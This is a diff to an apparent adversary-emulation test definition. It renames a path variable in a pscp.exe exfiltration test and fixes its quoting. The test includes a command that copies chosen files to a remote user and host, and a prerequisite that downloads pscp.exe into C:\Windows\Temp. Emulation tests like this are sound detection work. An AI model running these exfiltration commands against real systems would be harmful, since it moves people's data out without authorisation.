@@ -494,7 +494,7 @@
     windows:
       cmd:
         command: |
-          "#{pscp_local_path}"\pscp.exe -P "#{pscp_port}" "{pscp_exfil_files} "#{pscp_remote_user}"@"#{pscp_remote_host}":"#{pscp_drop_location}"
+          "#{pscp_exe}" -P #{pscp_port} "#{pscp_exfil_files}" "#{pscp_remote_user}@#{pscp_remote_host}:#{pscp_drop_location}"
         payloads:
         - pscp.exe
 
@@ -529,24 +529,24 @@
       type: URL
       default: https://the.earth.li/~sgtatham/putty/latest/w64/pscp.exe
 
-    pscp_local_path:
-      description: Local path to pscp exe file
+    pscp_exe:
+      description: Path of pscp.exe
       type: Path
-      default: C:\Windows\Temp
+      default: C:\Windows\Temp\pscp.exe
 
   dependency_executor_name: powershell
   dependencies:
   - description: |
-      pscp.exe must be located at "#{pscp_local_path}"
+      pscp.exe must exist on disk at specified location ("#{pscp_exe}")
     prereq_command: |
-      if (Test-Path "#{pscp_local_path}"\pscp.exe) {exit 0} else {exit 1}
+      if (Test-Path "#{pscp_exe}") {exit 0} else {exit 1}
     get_prereq_command: |
-      Invoke-WebRequest "#{pscp_url}" -OutFile "#{pscp_local_path}"\pscp.exe
+      Invoke-WebRequest "#{pscp_url}" -OutFile "#{pscp_exe}"
 
   executors:
   - name: command_prompt
     command: |
-      "#{pscp_local_path}"\pscp.exe -P "#{pscp_port}" "{pscp_exfil_files}" "#{pscp_remote_user}"@"#{pscp_remote_host}":"#{pscp_drop_location}"
+      "#{pscp_exe}" -P #{pscp_port} "#{pscp_exfil_files}" "#{pscp_remote_user}@#{pscp_remote_host}:#{pscp_drop_location}"
 
 # Phase 1/2: Exfiltration
 
